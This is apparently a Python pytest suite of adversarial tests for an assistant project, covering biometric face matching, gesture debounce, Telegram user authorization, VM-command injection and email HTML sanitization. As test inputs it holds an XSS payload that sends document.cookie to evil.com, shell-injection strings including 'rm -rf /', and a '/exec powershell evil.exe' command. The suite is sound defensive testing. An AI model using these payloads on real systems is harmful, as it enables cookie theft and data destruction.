"""
tests/test_adversarial_m5_2.py
==============================
Adversarial Security, Vision, Comms & Automation Stress Test Suite for Milestone 5.
Verified by Challenger 2 (Empirical Challenger).

Verification Scope:
1. Vision & Biometrics (jarvis/vision/biometrics.py, jarvis/vision/hands.py):
   - Boundary Euclidean distances (0.59 vs 0.60 vs 0.61, custom tolerances, multi-enrollment).
   - Dark / occluded frame suppression (np.mean < 5.0, 0-size, None).
   - Intruder auto-lock workstation and snapshot dispatch with Telegram integration.
   - Hand gesture debounce cooldown (0.8s), velocity thresholds, sub-threshold rejection.
2. Comms & Automation (jarvis/comms/telegram.py, jarvis/comms/email_imap.py, jarvis/automation/vm.py):
   - Unauthorized Telegram user ID rejection with 403 Forbidden and violation audit logging.
   - Malicious command injection prevention in VM Orchestrator (shell metacharacters, subshell execution).
   - Adversarial HTML / XSS / tag spoofing sanitization & voice formatting in IMAP email reader.
"""

import time
from typing import Any, Dict, List, Optional
from unittest.mock import MagicMock, patch

import numpy as np
import pytest

from jarvis.automation.vm import HypervisorType, VMOrchestrator, VMState
from jarvis.comms.email_imap import EmailMessage, IMAPEmailReader
from jarvis.comms.telegram import TelegramBotController
from jarvis.core.models import PrivilegeLevel, RequesterContext
from jarvis.vision.biometrics import (
    BiometricPrivilegeGate,
    BiometricsEngine,
    FaceEmbeddingStorage,
)
from jarvis.vision.hands import (
    GestureType,
    HandGestureClassifier,
    HandGestureEngine,
    HandLandmarkTracker,
    NormalizedLandmark,
)


# ============================================================================
# 1. VISION & BIOMETRICS ADVERSARIAL TESTS
# ============================================================================

class MockCameraWithEncodings:
    """Mock camera providing precise programmatic 128D face encodings."""

    def __init__(self, owner_encoding: np.ndarray):
        self.owner_encoding = owner_encoding
        self.cand_encoding = np.copy(owner_encoding)
        self.frame_counter = 0

    def set_candidate_encoding(self, encoding: np.ndarray) -> None:
        self.cand_encoding = encoding

    def get_face_encodings(self, frame: np.ndarray) -> List[np.ndarray]:
        if frame is None or getattr(frame, "size", 0) == 0 or np.mean(frame) < 5.0:
            return []
        return [self.cand_encoding]


def test_adversarial_biometrics_boundary_distances():
    """
    [Adversarial Challenge 1.1] Boundary Euclidean distances:
    Threshold = 0.60.
    - dist = 0.59 (< 0.60) -> Owner Verified (Match)
    - dist = 0.60 (== 0.60) -> Intruder (No Match, lock workstation)
    - dist = 0.61 (> 0.60) -> Intruder (No Match, lock workstation)
    """
    base_encoding = np.zeros(128, dtype=np.float64)
    base_encoding[0] = 1.0  # Unit vector

    cam = MockCameraWithEncodings(base_encoding)
    engine = BiometricsEngine(camera_feed=cam, tolerance=0.60)

    dummy_frame = np.full((480, 640, 3), 50, dtype=np.uint8)

    # 1. Distance = 0.59 (< 0.60) -> Match
    cand_59 = np.copy(base_encoding)
    cand_59[1] = 0.59
    cam.set_candidate_encoding(cand_59)
    assert engine.verify_frame(dummy_frame) is True
    res_59 = engine.process_surveillance_frame(dummy_frame)
    assert res_59["status"] == "owner_verified"
    assert res_59["locked"] is False
    assert pytest.approx(res_59["distance"], 0.001) == 0.59

    # 2. Distance = 0.60 (Exact tolerance boundary) -> No match, Lock
    cand_60 = np.copy(base_encoding)
    cand_60[1] = 0.60
    cam.set_candidate_encoding(cand_60)
    assert engine.verify_frame(dummy_frame) is False
    res_60 = engine.process_surveillance_frame(dummy_frame)
    assert res_60["status"] == "intruder_locked"
    assert res_60["locked"] is True
    assert pytest.approx(res_60["distance"], 0.001) == 0.60

    # 3. Distance = 0.61 (> 0.60) -> Intruder, Lock
    cand_61 = np.copy(base_encoding)
    cand_61[1] = 0.61
    cam.set_candidate_encoding(cand_61)
    assert engine.verify_frame(dummy_frame) is False
    res_61 = engine.process_surveillance_frame(dummy_frame)
    assert res_61["status"] == "intruder_locked"
    assert res_61["locked"] is True
    assert pytest.approx(res_61["distance"], 0.001) == 0.61


def test_adversarial_biometrics_custom_tolerances_and_multi_enrollment():
    """
    [Adversarial Challenge 1.2] Custom tolerance configuration and multi-enrolled owners.
    """
    owner1 = np.zeros(128, dtype=np.float64)
    owner1[0] = 1.0

    owner2 = np.zeros(128, dtype=np.float64)
    owner2[10] = 1.0

    cam = MockCameraWithEncodings(owner1)
    engine = BiometricsEngine(camera_feed=cam, tolerance=0.45)
    dummy_frame = np.full((480, 640, 3), 60, dtype=np.uint8)

    # Enroll secondary owner face
    cam.set_candidate_encoding(owner2)
    assert engine.enroll_face("owner_secondary", dummy_frame) is True

    # Candidate matching owner2 closely (dist = 0.20) but far from owner1 (dist > 1.0)
    cand_owner2 = np.copy(owner2)
    cand_owner2[11] = 0.20
    cam.set_candidate_encoding(cand_owner2)

    assert engine.verify_frame(dummy_frame) is True
    surv_res = engine.process_surveillance_frame(dummy_frame)
    assert surv_res["status"] == "owner_verified"
    assert surv_res["locked"] is False
    assert surv_res["distance"] < 0.45

    # Candidate at dist = 0.46 from closest owner -> rejected under tolerance 0.45
    cand_rejected = np.copy(owner1)
    cand_rejected[1] = 0.46
    cam.set_candidate_encoding(cand_rejected)
    assert engine.verify_frame(dummy_frame) is False
    surv_rej = engine.process_surveillance_frame(dummy_frame)
    assert surv_rej["status"] == "intruder_locked"


def test_adversarial_biometrics_dark_and_occluded_frames():
    """
    [Adversarial Challenge 1.3] Dark / occluded frames suppression (np.mean < 5.0).
    Pitch black or severely occluded frames must NOT trigger false positive intruder locks.
    """
    owner_enc = np.ones(128, dtype=np.float64) / np.sqrt(128)
    cam = MockCameraWithEncodings(owner_enc)
    engine = BiometricsEngine(camera_feed=cam)

    mock_win32 = MagicMock()
    mock_win32.lock_workstation_calls = 0

    # 1. Total black frame (mean = 0.0)
    frame_0 = np.zeros((480, 640, 3), dtype=np.uint8)
    assert engine.verify_frame(frame_0) is False
    res_0 = engine.process_surveillance_frame(frame_0, win32_platform=mock_win32)
    assert res_0["status"] == "no_face"
    assert mock_win32.lock_workstation_calls == 0

    # 2. Dark frame with mean = 4.9 (< 5.0)
    frame_4 = np.full((480, 640, 3), 4, dtype=np.uint8)
    assert engine.verify_frame(frame_4) is False
    res_4 = engine.process_surveillance_frame(frame_4, win32_platform=mock_win32)
    assert res_4["status"] == "no_face"
    assert mock_win32.lock_workstation_calls == 0

    # 3. None frame and 0-size frame
    assert engine.verify_frame(None) is False
    assert engine.process_surveillance_frame(None, win32_platform=mock_win32)["status"] == "no_face"
    assert engine.verify_frame(np.empty((0, 0, 3), dtype=np.uint8)) is False
    assert mock_win32.lock_workstation_calls == 0


def test_adversarial_biometrics_intruder_lock_and_telegram_dispatch():
    """
    [Adversarial Challenge 1.4] Intruder face triggers workstation lock AND Telegram alert snapshot.
    """
    owner_enc = np.zeros(128, dtype=np.float64)
    owner_enc[0] = 1.0

    intruder_enc = np.zeros(128, dtype=np.float64)
    intruder_enc[1] = 1.0  # Euclidean distance = sqrt(1^2 + 1^2) = 1.414 >> 0.60

    cam = MockCameraWithEncodings(owner_enc)
    engine = BiometricsEngine(camera_feed=cam, tolerance=0.60)

    # Intruder frame
    cam.set_candidate_encoding(intruder_enc)
    intruder_frame = np.full((480, 640, 3), 60, dtype=np.uint8)

    mock_win32 = MagicMock()
    mock_win32.lock_workstation_calls = 0

    mock_bot = MagicMock()
    mock_bot.send_photo = MagicMock()

    res = engine.process_surveillance_frame(
        intruder_frame,
        win32_platform=mock_win32,
        telegram_bot=mock_bot,
        chat_id=987654321,
    )

    assert res["status"] == "intruder_locked"
    assert res["locked"] is True
    assert mock_win32.lock_workstation_calls == 1
    mock_bot.send_photo.assert_called_once()
    call_args = mock_bot.send_photo.call_args[1]
    assert call_args["chat_id"] == 987654321
    assert "CẢNH BÁO" in call_args["caption"]


def test_adversarial_hand_gesture_debounce_and_velocity_thresholds():
    """
    [Adversarial Challenge 1.5] Hand gesture debounce and velocity thresholds.
    """
    classifier = HandGestureClassifier(debounce_cooldown_s=0.8)

    def make_fist_landmarks(center_x=0.5, center_y=0.5):
        return [NormalizedLandmark(x=center_x + np.sin(i)*0.005, y=center_y + np.cos(i)*0.005, z=0.0) for i in range(21)]

    def make_open_palm_landmarks(center_x=0.5, center_y=0.5):
        lms = []
        for i in range(21):
            lms.append(NormalizedLandmark(x=center_x + (i % 5)*0.03, y=center_y - (i // 5)*0.08, z=0.0))
        return lms

    # 1. Fist Clench Trigger & Debounce
    fist_lms = make_fist_landmarks()
    g1 = classifier.classify(fist_lms)
    assert g1 == GestureType.FIST

    # Immediate second frame (within 0.8s) -> MUST return NONE (debounced)
    g2 = classifier.classify(fist_lms)
    assert g2 == GestureType.NONE

    # After cooldown elapsed -> Can trigger again
    classifier.last_trigger_time -= 0.85
    g3 = classifier.classify(fist_lms)
    assert g3 == GestureType.FIST

    # 2. Swipe Left / Right Velocity Thresholds
    classifier.last_trigger_time = 0.0
    classifier.position_history.clear()

    # Sub-threshold slow drift: movement from 0.50 to 0.46 over 0.6s (dx = -0.04, vel = -0.066) -> NONE
    t0 = time.time()
    lms_start = make_open_palm_landmarks(center_x=0.50)
    lms_slow = make_open_palm_landmarks(center_x=0.46)

    classifier.position_history = [(0.50, t0 - 0.6)]
    g_slow = classifier.classify(lms_slow)
    assert g_slow != GestureType.SWIPE_LEFT

    # Rapid high-velocity swipe left: movement from 0.80 to 0.25 (dx = -0.55) -> SWIPE_LEFT
    classifier.last_trigger_time = 0.0
    classifier.position_history = [(0.80, time.time() - 0.15)]
    lms_swipe_left = make_open_palm_landmarks(center_x=0.25)
    g_swipe = classifier.classify(lms_swipe_left)
    assert g_swipe == GestureType.SWIPE_LEFT

    # Immediate consecutive swipe right without cooldown -> Debounced to NONE
    classifier.position_history = [(0.20, time.time() - 0.15)]
    lms_swipe_right = make_open_palm_landmarks(center_x=0.80)
    g_swipe_debounced = classifier.classify(lms_swipe_right)
    assert g_swipe_debounced == GestureType.NONE


# ============================================================================
# 2. COMMS & AUTOMATION ADVERSARIAL TESTS
# ============================================================================

def test_adversarial_telegram_unauthorized_user_rejection_and_audit():
    """
    [Adversarial Challenge 2.1] Unauthorized Telegram User ID Rejection with 403 Forbidden.
    Attacker sending /status, /exec, /lock, /healing or voice notes must be strictly rejected.
    """
    allowed_users = {111222333, 444555666}
    mock_dispatcher = MagicMock()
    mock_dispatcher.event_bus = MagicMock()

    controller = TelegramBotController(
        allowed_user_ids=allowed_users,
        dispatcher=mock_dispatcher,
    )

    attacker_id = 999888777

    # Attack 1: Attempt /exec to run unauthorized arbitrary command
    res1 = controller.handle_inbound_message(
        user_id=attacker_id,
        text="/exec powershell evil.exe",
    )
    assert res1["status"] == 403
    assert res1["rejected"] is True
    assert "Forbidden" in res1["error"]
    assert attacker_id in controller.security_violations
    mock_dispatcher.dispatch_action.assert_not_called()

    # Attack 2: Attempt /lock to cause denial of service
    res2 = controller.handle_inbound_message(user_id=attacker_id, text="/lock")
    assert res2["status"] == 403
    assert res2["rejected"] is True

    # Attack 3: Attempt inbound voice note spoofing
    res3 = controller.handle_inbound_voice(user_id=attacker_id, voice_bytes=b"fake_malicious_pcm_payload")
    assert res3["status"] == 403
    assert res3["rejected"] is True

    # Authorized user works normally
    res_auth = controller.handle_inbound_message(user_id=111222333, text="/status")
    assert res_auth["status"] == 200
    assert "bình thường" in res_auth["text"] or "normal" in res_auth["text"].lower() or "hoạt động" in res_auth["text"].lower()


def test_adversarial_vm_orchestrator_command_injection_prevention():
    """
    [Adversarial Challenge 2.2] Malicious command injection prevention in VM Orchestrator.
    Verifies that VM names with shell metacharacters cannot execute subshells or chained commands.
    """
    orchestrator = VMOrchestrator(dry_run=False, vmrun_path="vmrun.exe", vboxmanage_path="VBoxManage.exe")

    injection_payloads = [
        "ubuntu.vmx & calc.exe",
        "ubuntu.vmx; rm -rf /",
        "ubuntu.vmx | whoami",
        "test && start cmd.exe",
    ]

    for payload in injection_payloads:
        with patch("shutil.which", return_value="C:\\Program Files\\VMware\\vmrun.exe"):
            with patch("subprocess.run") as mock_run:
                mock_run.return_value = MagicMock(returncode=0, stdout="VM started", stderr="")
                res = orchestrator.start_vm(vm_name=payload, hypervisor="vmware")
                
                assert mock_run.called
                called_args, called_kwargs = mock_run.call_args
                cmd_list = called_args[0]
                
                assert isinstance(cmd_list, list)
                assert payload in cmd_list
                assert called_kwargs.get("shell", False) is False

        with patch("shutil.which", return_value="C:\\Program Files\\Oracle\\VirtualBox\\VBoxManage.exe"):
            with patch("subprocess.run") as mock_run:
                mock_run.return_value = MagicMock(returncode=0, stdout="VM stopped", stderr="")
                res_stop = orchestrator.stop_vm(vm_name=payload, hypervisor="virtualbox")
                assert mock_run.called
                called_args, called_kwargs = mock_run.call_args
                cmd_list = called_args[0]
                assert isinstance(cmd_list, list)
                assert payload in cmd_list
                assert called_kwargs.get("shell", False) is False


def test_adversarial_imap_email_html_sanitization_and_xss_prevention():
    """
    [Adversarial Challenge 2.3] HTML sanitization and XSS stripping in IMAP email parser.
    Ensures script tags, event handlers, and entity escapes are sanitized cleanly.
    """
    reader = IMAPEmailReader(priority_senders=["boss@company.com", "security@corp.vn"])

    malicious_body = (
        "<p>Hello User,</p>"
        "<script type='text/javascript'>alert('XSS_ATTACK'); window.location='http://phishing.site';</script>"
        "<img src=x onerror='fetch(\"http://evil.com/leak?cookie=\" + document.cookie)'>"
        "<div class='critical'>Server cluster &amp; database &lt;CRITICAL_ALERT&gt; require immediate action.</div>"
        "<a href='javascript:void(0)'>Click &quot;CONFIRM&quot;</a>"
    )

    emails = [
        EmailMessage(
            sender="boss@company.com",
            subject="Khẩn cấp: Tình hình cụm máy chủ",
            body_text=malicious_body,
            is_priority=True,
        ),
        EmailMessage(
            sender="spammer@marketing.com",
            subject="Discount Offer",
            body_text="<p>Buy now for cheap!</p>",
            is_priority=False,
        ),
    ]

    summary = reader.fetch_and_summarize(mock_emails=emails)

    assert summary["total_unread"] == 2
    assert summary["priority_count"] == 1
    voice_txt = summary["voice_summary"]

    assert "<script" not in voice_txt
    assert "</script>" not in voice_txt
    assert "<img" not in voice_txt
    assert "onerror=" not in voice_txt
    assert "<p>" not in voice_txt
    assert "<div" not in voice_txt

    assert "&amp;" not in voice_txt
    assert "&lt;" not in voice_txt
    assert "&gt;" not in voice_txt
    assert "&quot;" not in voice_txt
    assert "&" in voice_txt
    assert '"CONFIRM"' in voice_txt

    assert "boss@company.com" in voice_txt
    assert "Tóm tắt:" in voice_txt


# ============================================================================
# 3. EXTENDED PRIVILEGE GATE, POLLING & VM ERROR HANDLING TESTS
# ============================================================================

def test_adversarial_biometric_privilege_gate_session_ttl_and_invalidation():
    """
    [Adversarial Challenge 3.1] Privilege Gate TTL expiration and active session invalidation.
    """
    base_encoding = np.zeros(128, dtype=np.float64)
    base_encoding[0] = 1.0
    cam = MockCameraWithEncodings(base_encoding)
    engine = BiometricsEngine(camera_feed=cam, tolerance=0.60)
    gate = BiometricPrivilegeGate(biometrics=engine, session_ttl_s=10.0)

    dummy_frame = np.full((480, 640, 3), 50, dtype=np.uint8)

    # 1. Initially unauthenticated -> False
    assert gate.is_allowed("privileged_action", None) is False

    # 2. Authenticate with owner face -> Session valid
    ctx = gate.authenticate(dummy_frame)
    assert ctx is not None
    assert gate.is_allowed("privileged_action", None) is True
    assert gate.is_session_valid() is True

    # 3. Simulate TTL expiration
    gate._active_session = (ctx, time.time() - 15.0)
    assert gate.is_session_valid() is False
    assert gate.is_allowed("privileged_action", None) is False

    # 4. Immediate manual invalidation
    gate.authenticate(dummy_frame)
    assert gate.is_session_valid() is True
    gate.invalidate_session()
    assert gate.is_session_valid() is False
    assert gate.is_allowed("privileged_action", None) is False


def test_adversarial_telegram_poll_queue_and_error_isolation():
    """
    [Adversarial Challenge 3.2] Telegram poll queue batching and command execution error isolation.
    """
    allowed_users = {10001, 10002}
    mock_dispatcher = MagicMock()
    # Simulate dispatcher raising exception on broken plugin execution
    mock_dispatcher.dispatch_action.side_effect = RuntimeError("Plugin crashed unexpectedly")

    controller = TelegramBotController(
        allowed_user_ids=allowed_users,
        dispatcher=mock_dispatcher,
    )

    # 1. Error isolation on /exec
    res_err = controller.handle_inbound_message(user_id=10001, text="/exec faulty_plugin")
    assert res_err["status"] == 500
    assert "Lỗi thực thi lệnh" in res_err["text"]

    # 2. Inbound Queue processing via poll_once
    class MockHttpQueue:
        def __init__(self):
            import queue
            self.telegram_inbound_queue = queue.Queue()

    mock_http = MockHttpQueue()
    mock_http.telegram_inbound_queue.put({
        "message": {"from": {"id": 10001}, "text": "/status", "chat": {"id": 10001}}
    })
    mock_http.telegram_inbound_queue.put({
        "message": {"from": {"id": 99999}, "text": "/lock", "chat": {"id": 99999}}
    })

    updates = controller.poll_once(mock_http=mock_http)
    assert len(updates) == 2
    assert updates[0]["status"] == 200
    assert updates[1]["status"] == 403
    assert updates[1]["rejected"] is True
    assert 99999 in controller.security_violations


def test_adversarial_vm_orchestrator_subprocess_errors_and_timeouts():
    """
    [Adversarial Challenge 3.3] VM Orchestrator subprocess failure, timeout, and state mapping.
    """
    import subprocess
    orchestrator = VMOrchestrator(dry_run=False, vmrun_path="vmrun.exe", vboxmanage_path="VBoxManage.exe")

    # 1. Subprocess Timeout
    with patch("shutil.which", return_value="vmrun.exe"):
        with patch("subprocess.run", side_effect=subprocess.TimeoutExpired(cmd="vmrun", timeout=30)):
            res_timeout = orchestrator.start_vm("test_vm.vmx", hypervisor="vmware")
            assert res_timeout["success"] is False
            assert res_timeout["state"] == VMState.UNKNOWN.value

    # 2. Subprocess Non-Zero Exit Code (e.g. VM file corrupted / missing)
    with patch("shutil.which", return_value="VBoxManage.exe"):
        with patch("subprocess.run", return_value=MagicMock(returncode=1, stdout="", stderr="Error: VM not found")):
            res_fail = orchestrator.start_vm("non_existent_vm", hypervisor="virtualbox")
            assert res_fail["success"] is False
            assert res_fail["state"] == VMState.STOPPED.value
            assert "Error: VM not found" in res_fail["message"]



